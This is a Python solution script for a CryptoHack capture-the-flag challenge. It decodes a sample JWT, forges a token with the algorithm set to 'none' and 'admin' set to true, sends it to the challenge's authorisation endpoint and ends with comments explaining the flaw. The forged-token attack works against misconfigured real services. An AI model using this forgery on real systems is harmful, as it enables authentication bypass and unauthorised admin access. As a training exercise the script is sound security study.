import requests
import base64

# Challenge endpoint
URL = "http://web.cryptohack.org/no-way-jose/"

def get_auth_route(token):
    return URL + f"authorise/{token}/"

sample = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Impvc2UiLCJhZG1pbiI6ZmFsc2V9.N0TFykHTio1H705Ycipb4V4bV0vPXRQvu_8D4n8xB7I"
jwt = sample.split(".")

# Decode header
header = base64.b64decode(jwt[0]) 
print(header) # {"typ":"JWT","alg":"HS256"}
payload = base64.b64decode(jwt[1])
print(payload) # {"username":"jose","admin":false}

# Craft a header
mock_header = base64.b64encode(b'{"typ":"JWT","alg":"none" }').decode("utf-8")
mock_payload = base64.b64encode(b'{"username":"user","admin": true}').decode("utf-8")
mock_jwt = ".".join([mock_header, mock_payload, jwt[2]])
print("Mock JWT", mock_jwt)

# Send a request
r = requests.get(get_auth_route(mock_jwt))
print(r.content.decode("utf-8"))

#Solution
#The script demonstrates a vulnerability in JSON Web Tokens (JWT) where the algorithm is set to none, allowing tampering with the token. 
#It decodes a JWT to inspect its header and payload, which initially contains the username "jose" and admin: false.
#Then, the script crafts a modified JWT with the algorithm set to none, and changes the payload to set admin: true for a different username.
#Finally, it sends the manipulated JWT to the authorization endpoint to gain access as an admin.
